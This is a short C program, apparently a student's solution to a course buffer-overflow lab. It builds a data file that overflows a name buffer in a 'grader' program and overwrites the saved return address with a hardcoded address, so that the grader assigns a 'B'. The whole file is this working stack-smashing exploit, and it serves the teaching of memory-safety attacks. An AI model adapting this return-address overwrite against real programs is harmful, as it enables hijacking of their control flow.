/*--------------------------------------------------------------------*/
/* createdataB.c                                                      */
/* Author: Alex Luo, Rohan Amin                                       */
/*--------------------------------------------------------------------*/

#include <stdio.h>


/* This function takes no command-line arguments and does not read from 
   any streams. It writes to a file dataB, creating a file that, when 
   piped to the grader program, will cause the grader program to 
   recommend a "B" grade for "Rohan Alex". It then returns 0. */

int main(void){
   FILE *psFile;
   int i;
   unsigned long ulData;
   psFile = fopen("dataB", "w");

   /* Puts names in buf array to be copied */ 
   fputs("Rohan Alex",psFile);

   /* Fills the rest of buf array with null bytes */ 
   for (i = 0; i < 38; i++)
      putc('\0', psFile);

   /* Overwrites getName x30 return address with location
      of grade = B instruction in grader's main function*/ 
   ulData = 0x400858;
   fwrite(&ulData, sizeof(unsigned long), 1, psFile);
   fclose(psFile); 
   return 0; 
}
